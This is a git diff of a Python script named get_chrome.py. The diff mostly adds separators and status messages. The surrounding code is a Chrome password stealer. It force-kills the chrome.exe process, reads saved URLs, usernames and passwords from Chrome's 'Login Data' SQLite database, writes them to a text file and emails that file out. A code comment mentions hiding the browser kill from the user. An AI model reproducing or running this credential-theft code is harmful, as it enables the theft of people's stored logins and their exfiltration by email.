@@ -21,16 +21,23 @@ import psutil
 import uuid
 import getpass
 
-print("You're in control of everything.")
-Changelog = "Latest Update: \nThursday 9th January 2020\n• Manually import Email Data\n• Gets advanced PC information\n• Entirely accessable, everything that's happening is displayed.\nTuesday, 14/01/2020:\n• get_chrome is now entirely a UI based console, everything that goes on is beneath your eyes!"
+# print separator
+sep = "----------------------------------------------------------------------------------------------"
+min_sep = "--------------------------------"
+med_sep = "--------------------------------------------------"
+print(min_sep)
+Changelog = "Latest Update: \n\nThursday 9th January 2020\n• Manually import Email Data\n• Gets advanced PC information\n• Entirely accessable, everything that's happening is displayed.\n\nTuesday, 14/01/2020:\n• get_chrome is now entirely a UI based console, everything that goes on is beneath your eyes!\n"
 print(Changelog)
+print(sep)
 time.sleep(5)
 
 # kills all browser services(this script works only on chrome, as of right now.)
 def kill_browsers():
+	print("Killing Chrome Task\n-------------------")
 	## kill browsers ##
 	browserExe = "chrome.exe"
 	os.system("taskkill /f /im "+browserExe)
+	print("-------------------------------------------")
 	#clear messages
 	#os.system("cls")
 	# kills chrome // OTHER BROWSERS ARE BLANKED OUT UNTIL WE RELEASE A STABLE RELEASE OF THEM //
@@ -55,7 +62,6 @@ def kill_browsers():
 	# clears console, making it invisible to user that we killed browser's process
 	#os.system("cls")
 
-print("Writing Variables")
 # gather user info
 program_name = 'get_chrome.py'
 datetime = time.ctime(time.time())
@@ -71,16 +77,19 @@ Release = platform.release()
 Version = platform.version()
 NOC = psutil.cpu_count()
 welcome = 'Welcome ' + user + ' to ' + program_name + '!'
-owner = '\nThis program was made by Parad0xxxx and Snavellet!'
+owner = 'This program was made by Parad0xxxx and Snavellet!'
 warning = '\nThis program was intended for Developer Usage. Use with caution. If you choose to disobey these directions, you are at jeopardy!\n\n'
 old_app = ''
 filename = 'get_chrome.txt'
-print("Variables Written")
 
 # sees if the OS is windows, if so - continue. If not - exits.
 if (OS == "Windows"):
-	print(welcome, owner)
+	print(welcome)
+	print(med_sep)
+	print(owner)
+	print(med_sep)
 	print("Your OS is supported")
+	print(min_sep)
 	pass # Continues script
 else: # Exits the script with a message
 	print(OS + " is incompatible :(\nThis program only supports Windows systems\nparad0x's team will support your OS in future updates!") # Prints the compatable OS for this program.
@@ -89,19 +98,19 @@ else: # Exits the script with a message
 
 
 def text_file():
-	print("Locating Chrome directory")
+	print("Locating Chrome directory\n-------------------------")
 	# directs to Chrome directory
 	data_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
-	print("Directory found")
+	print("* Directory found\n-----------------")
 	c = sqlite3.connect(data_path)
 	cursor = c.cursor()
-	print("Finding and writing Login Details")
+	print("Locating Login Details\n----------------------")
 	select_statement = 'SELECT origin_url, username_value, password_value FROM logins'
 	# checks to see if database is locked	
 	cursor.execute(select_statement) # if you're given "database is locked" (which you wont, because # kill chrome does that for you automatically.
 	# fetches all chrome tables from database
 	login_data = cursor.fetchall()
-	print("Login Details found")
+	print("* Login Details found\n---------------------")
 
 	#credential dictionary		
 	cred = {}
@@ -132,6 +141,8 @@ def text_file():
 
 # sends .txt as an attachment, to your email
 def send_stuff():
+	print("Starting Email Service\n---------------------")
+	time.sleep(1)
 	email_from = input("Enter your Email Address: ")
 	password = getpass.getpass("Enter your Email Address password: ")
 	email_to = input("Enter receiver Email Address: ")
